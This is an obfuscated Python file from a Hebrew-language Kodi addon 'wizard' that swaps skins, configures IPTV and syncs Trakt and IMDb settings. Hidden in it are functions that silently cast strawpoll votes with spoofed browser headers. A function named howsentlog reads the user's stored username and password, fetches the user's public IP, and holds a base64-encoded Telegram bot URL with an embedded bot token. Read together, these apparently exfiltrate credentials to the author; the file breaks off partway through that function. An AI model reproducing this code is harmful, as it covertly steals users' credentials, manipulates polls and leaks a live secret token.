# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
IPTVSIMPL18PC =uservar .IPTVSIMPL18PC #line:220
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
def MainMenu ():#line:257
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:259
def skinWIN ():#line:260
	idle ()#line:261
	O00OO000O0OOO00O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:262
	O00O00O0OOOOOO0OO =[];OO0O0OO0O0OO0000O =[]#line:263
	for O0OO00OOOOOOOOOOO in sorted (O00OO000O0OOO00O0 ,key =lambda O0O00O00O0O0OOO0O :O0O00O00O0O0OOO0O ):#line:264
		O000000O0O000OO0O =os .path .split (O0OO00OOOOOOOOOOO [:-1 ])[1 ]#line:265
		OOOO0000OOOO00OO0 =os .path .join (O0OO00OOOOOOOOOOO ,'addon.xml')#line:266
		if os .path .exists (OOOO0000OOOO00OO0 ):#line:267
			O0OOO0O00000000OO =open (OOOO0000OOOO00OO0 )#line:268
			O000O0O00OOO0OOOO =O0OOO0O00000000OO .read ()#line:269
			O0O0O00000OO0OO00 =parseDOM2 (O000O0O00OOO0OOOO ,'addon',ret ='id')#line:270
			OO000OOO0O0OOO0O0 =O000000O0O000OO0O if len (O0O0O00000OO0OO00 )==0 else O0O0O00000OO0OO00 [0 ]#line:271
			try :#line:272
				OO0OO00O00O00OOOO =xbmcaddon .Addon (id =OO000OOO0O0OOO0O0 )#line:273
				O00O00O0OOOOOO0OO .append (OO0OO00O00O00OOOO .getAddonInfo ('name'))#line:274
				OO0O0OO0O0OO0000O .append (OO000OOO0O0OOO0O0 )#line:275
			except :#line:276
				pass #line:277
	O00000OOO0O000OO0 =[];O00OO0000OOOO0000 =0 #line:278
	O00O0000000OOO0O0 =["Current Skin -- %s"%currSkin ()]+O00O00O0OOOOOO0OO #line:279
	O00OO0000OOOO0000 =DIALOG .select ("Select the Skin you want to swap with.",O00O0000000OOO0O0 )#line:280
	if O00OO0000OOOO0000 ==-1 :return #line:281
	else :#line:282
		OOOOO0O0O00O0000O =(O00OO0000OOOO0000 -1 )#line:283
		O00000OOO0O000OO0 .append (OOOOO0O0O00O0000O )#line:284
		O00O0000000OOO0O0 [O00OO0000OOOO0000 ]="%s"%(O00O00O0OOOOOO0OO [OOOOO0O0O00O0000O ])#line:285
	if O00000OOO0O000OO0 ==None :return #line:286
	for O0O0OOO00O00OO0O0 in O00000OOO0O000OO0 :#line:287
		swapSkins (OO0O0OO0O0OO0000O [O0O0OOO00O00OO0O0 ])#line:288
def currSkin ():#line:290
	return xbmc .getSkinDir ('Container.PluginName')#line:291
def swapSkins (O0OOO0000000O00OO ,title ="Error"):#line:292
	OO00O00OOOOO0OOO0 ='lookandfeel.skin'#line:293
	OOO0O000O000OO00O =O0OOO0000000O00OO #line:294
	O0OOOO0O0000OOO0O =getOld (OO00O00OOOOO0OOO0 )#line:295
	OO0OO000OO0000O00 =OO00O00OOOOO0OOO0 #line:296
	setNew (OO0OO000OO0000O00 ,OOO0O000O000OO00O )#line:297
	O00OOO00O0OOOOOOO =0 #line:298
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOO00O0OOOOOOO <100 :#line:299
		O00OOO00O0OOOOOOO +=1 #line:300
		xbmc .sleep (1 )#line:301
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:302
		xbmc .executebuiltin ('SendClick(11)')#line:303
	return True #line:304
def getOld (OOO00000OOO00OOOO ):#line:306
	try :#line:307
		OOO00000OOO00OOOO ='"%s"'%OOO00000OOO00OOOO #line:308
		OOO0O0OO00OOO0OOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOO00000OOO00OOOO )#line:309
		O00OOO0OOOOO0O0O0 =xbmc .executeJSONRPC (OOO0O0OO00OOO0OOO )#line:311
		O00OOO0OOOOO0O0O0 =simplejson .loads (O00OOO0OOOOO0O0O0 )#line:312
		if O00OOO0OOOOO0O0O0 .has_key ('result'):#line:313
			if O00OOO0OOOOO0O0O0 ['result'].has_key ('value'):#line:314
				return O00OOO0OOOOO0O0O0 ['result']['value']#line:315
	except :#line:316
		pass #line:317
	return None #line:318
def setNew (OO0OO0OO00O000OO0 ,O00OO00OOOO00O0O0 ):#line:321
	try :#line:322
		OO0OO0OO00O000OO0 ='"%s"'%OO0OO0OO00O000OO0 #line:323
		O00OO00OOOO00O0O0 ='"%s"'%O00OO00OOOO00O0O0 #line:324
		OO0000000OOO0O000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OO0OO00O000OO0 ,O00OO00OOOO00O0O0 )#line:325
		OO0O0OO000O00O0O0 =xbmc .executeJSONRPC (OO0000000OOO0O000 )#line:327
	except :#line:328
		pass #line:329
	return None #line:330
def idle ():#line:331
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:332
def resetkodi ():#line:334
		if xbmc .getCondVisibility ('system.platform.windows'):#line:335
			OO0OO00O0OO000OO0 =xbmcgui .DialogProgress ()#line:336
			OO0OO00O0OO000OO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:339
			OO0OO00O0OO000OO0 .update (0 )#line:340
			for O0OOO0O0O0000OO0O in range (5 ,-1 ,-1 ):#line:341
				time .sleep (1 )#line:342
				OO0OO00O0OO000OO0 .update (int ((5 -O0OOO0O0O0000OO0O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOO0O0O0000OO0O ),'')#line:343
				if OO0OO00O0OO000OO0 .iscanceled ():#line:344
					from resources .libs import win #line:345
					return None ,None #line:346
			from resources .libs import win #line:347
		else :#line:348
			OO0OO00O0OO000OO0 =xbmcgui .DialogProgress ()#line:349
			OO0OO00O0OO000OO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:352
			OO0OO00O0OO000OO0 .update (0 )#line:353
			for O0OOO0O0O0000OO0O in range (5 ,-1 ,-1 ):#line:354
				time .sleep (1 )#line:355
				OO0OO00O0OO000OO0 .update (int ((5 -O0OOO0O0O0000OO0O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO0O0O0000OO0O ),'')#line:356
				if OO0OO00O0OO000OO0 .iscanceled ():#line:357
					os ._exit (1 )#line:358
					return None ,None #line:359
			os ._exit (1 )#line:360
def backtokodi ():#line:362
			wiz .kodi17Fix ()#line:363
			fix18update ()#line:364
			fix17update ()#line:365
def testcommand1 ():#line:367
    import requests #line:368
    OOOOOOO00O00OO00O ='18773068'#line:369
    O00OOO00OO0000OOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOOOOO00O00OO00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:381
    OO0O0O00000000O0O ='145273320'#line:383
    O0OO0O0000O0OO0O0 ='145272688'#line:384
    if ADDON .getSetting ("auto_rd")=='true':#line:385
        O00OOOOOOO0O0O000 =OO0O0O00000000O0O #line:386
    else :#line:387
        O00OOOOOOO0O0O000 =O0OO0O0000O0OO0O0 #line:388
    OOO0O0OOO0O00OO0O ={'options':O00OOOOOOO0O0O000 }#line:392
    O0000OOOOOO00O0O0 =requests .post ('https://www.strawpoll.me/'+OOOOOOO00O00OO00O ,headers =O00OOO00OO0000OOO ,data =OOO0O0OOO0O00OO0O )#line:394
def builde_Votes ():#line:395
   try :#line:396
        import requests #line:397
        O0000OO0O00O00OO0 ='18773068'#line:398
        OOO00O0OOO000OO0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0000OO0O00O00OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:410
        O0O00O0OO000OOO0O ='145273320'#line:412
        OOOOO0O000OO00O0O ={'options':O0O00O0OO000OOO0O }#line:418
        O0OO0000O0O00000O =requests .post ('https://www.strawpoll.me/'+O0000OO0O00O00OO0 ,headers =OOO00O0OOO000OO0O ,data =OOOOO0O000OO00O0O )#line:420
   except :pass #line:421
def update_Votes ():#line:422
   try :#line:423
        import requests #line:424
        OOOO0O000OOOO0O0O ='18773068'#line:425
        OO0O0O0OO000O0OO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOO0O000OOOO0O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:437
        O00O0O0O0OO0O0OO0 ='145273321'#line:439
        OO0O0OO000OO0OOOO ={'options':O00O0O0O0OO0O0OO0 }#line:445
        OO0O0O00O0O0O0OO0 =requests .post ('https://www.strawpoll.me/'+OOOO0O000OOOO0O0O ,headers =OO0O0O0OO000O0OO0 ,data =OO0O0OO000OO0OOOO )#line:447
   except :pass #line:448
def testcommand ():#line:452
    setautorealdebrid ()#line:453
def skin_homeselect ():#line:454
	try :#line:456
		OOO0O0O000OO0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:457
		O0OO0O00O0O0OOO00 =open (OOO0O0O000OO0O0O0 ,'r')#line:459
		O0O00O000OOO00OOO =O0OO0O00O0O0OOO00 .read ()#line:460
		O0OO0O00O0O0OOO00 .close ()#line:461
		O0O000OOOOOOOOOO0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:462
		O00O0O00OOOO0O0O0 =re .compile (O0O000OOOOOOOOOO0 ).findall (O0O00O000OOO00OOO )[0 ]#line:463
		O0OO0O00O0O0OOO00 =open (OOO0O0O000OO0O0O0 ,'w')#line:464
		O0OO0O00O0O0OOO00 .write (O0O00O000OOO00OOO .replace ('<setting id="HomeS" type="string%s/setting>'%O00O0O00OOOO0O0O0 ,'<setting id="HomeS" type="string"></setting>'))#line:465
		O0OO0O00O0O0OOO00 .close ()#line:466
	except :#line:467
		pass #line:468
def autotrakt ():#line:471
    O000OO0O0OOO0O00O =(ADDON .getSetting ("auto_trk"))#line:472
    if O000OO0O0OOO0O00O =='true':#line:473
       from resources .libs import trk_aut #line:474
def traktsync ():#line:476
     OOOO00000OO0O0OO0 =(ADDON .getSetting ("auto_trk"))#line:477
     if OOOO00000OO0O0OO0 =='true':#line:478
       from resources .libs import trk_aut #line:481
     else :#line:482
        ADDON .openSettings ()#line:483
def imdb_synck ():#line:485
   try :#line:486
     OO0O0OOO0O0O000O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:487
     OO0OOO000OOO0OOOO =xbmcaddon .Addon ('plugin.video.gaia')#line:488
     OO0OOO0000OO0O000 =(ADDON .getSetting ("imdb_sync"))#line:489
     OOO000000O0O0O00O ="imdb.user"#line:490
     O0O00OO00O000OOOO ="accounts.informants.imdb.user"#line:491
     OO0O0OOO0O0O000O0 .setSetting (OOO000000O0O0O00O ,str (OO0OOO0000OO0O000 ))#line:492
     OO0OOO000OOO0OOOO .setSetting ('accounts.informants.imdb.enabled','true')#line:493
     OO0OOO000OOO0OOOO .setSetting (O0O00OO00O000OOOO ,str (OO0OOO0000OO0O000 ))#line:494
   except :pass #line:495
def dis_or_enable_addon (O000000OOOO0O0O00 ,O00OO0OO00OO0OO00 ,enable ="true"):#line:497
    import json #line:498
    O00OO0OOOO000OOO0 ='"%s"'%O000000OOOO0O0O00 #line:499
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O000000OOOO0O0O00 )and enable =="true":#line:500
        logging .warning ('already Enabled')#line:501
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O000000OOOO0O0O00 )#line:502
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O000000OOOO0O0O00 )and enable =="false":#line:503
        return xbmc .log ("### Skipped %s, reason = not installed"%O000000OOOO0O0O00 )#line:504
    else :#line:505
        OOOO0000000O0OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OO0OOOO000OOO0 ,enable )#line:506
        O0OOOO00O0OO00OO0 =xbmc .executeJSONRPC (OOOO0000000O0OO00 )#line:507
        OOOOO0OOO0O00OO0O =json .loads (O0OOOO00O0OO00OO0 )#line:508
        if enable =="true":#line:509
            xbmc .log ("### Enabled %s, response = %s"%(O000000OOOO0O0O00 ,OOOOO0OOO0O00OO0O ))#line:510
        else :#line:511
            xbmc .log ("### Disabled %s, response = %s"%(O000000OOOO0O0O00 ,OOOOO0OOO0O00OO0O ))#line:512
    if O00OO0OO00OO0OO00 =='auto':#line:513
     return True #line:514
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:515
def iptvset ():#line:518
  try :#line:519
    OOOO0O0O000O00O00 =(ADDON .getSetting ("iptv_on"))#line:520
    if OOOO0O0O000O00O00 =='true':#line:522
       if KODIV >=17 and KODIV <18 :#line:524
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:525
         O0O0O0OOOO00O0000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:526
         OO0OOOOO0OOOOO000 =(ADDON .getSetting ("iptvUrl"))#line:528
         O0O0O0OOOO00O0000 .setSetting ('m3uUrl',OO0OOOOO0OOOOO000 )#line:529
         OO0O00OOOOO000000 =(ADDON .getSetting ("epg_Url"))#line:530
         O0O0O0OOOO00O0000 .setSetting ('epgUrl',OO0O00OOOOO000000 )#line:531
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:534
         iptvsimpldownpc ()#line:535
         wiz .kodi17Fix ()#line:536
         xbmc .sleep (1000 )#line:537
         O0O0O0OOOO00O0000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:538
         OO0OOOOO0OOOOO000 =(ADDON .getSetting ("iptvUrl"))#line:539
         O0O0O0OOOO00O0000 .setSetting ('m3uUrl',OO0OOOOO0OOOOO000 )#line:540
         OO0O00OOOOO000000 =(ADDON .getSetting ("epg_Url"))#line:541
         O0O0O0OOOO00O0000 .setSetting ('epgUrl',OO0O00OOOOO000000 )#line:542
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:544
         iptvsimpldown ()#line:545
         wiz .kodi17Fix ()#line:546
         xbmc .sleep (1000 )#line:547
         O0O0O0OOOO00O0000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:548
         OO0OOOOO0OOOOO000 =(ADDON .getSetting ("iptvUrl"))#line:549
         O0O0O0OOOO00O0000 .setSetting ('m3uUrl',OO0OOOOO0OOOOO000 )#line:550
         OO0O00OOOOO000000 =(ADDON .getSetting ("epg_Url"))#line:551
         O0O0O0OOOO00O0000 .setSetting ('epgUrl',OO0O00OOOOO000000 )#line:552
  except :pass #line:553
def howsentlog ():#line:560
       try :#line:561
          import json #line:562
          OO0O0OO0OO00OOO00 =(ADDON .getSetting ("user"))#line:563
          OO00OOO000OO0000O =(ADDON .getSetting ("pass"))#line:564
          O0000OO0OO00O00OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:565
          OOO0OO00000O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:567
          OOOO000O00O0OOO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:568
          OO00O0O0O00OO000O =str (json .loads (OOOO000O00O0OOO00 )['ip'])#line:569
          O0OOOO0OO00O00O00 =OO0O0OO0OO00OOO00 #line:570
          O0O0O0000O00OOO00 =OO00OOO000OO0000O #line:571
          import socket #line:573
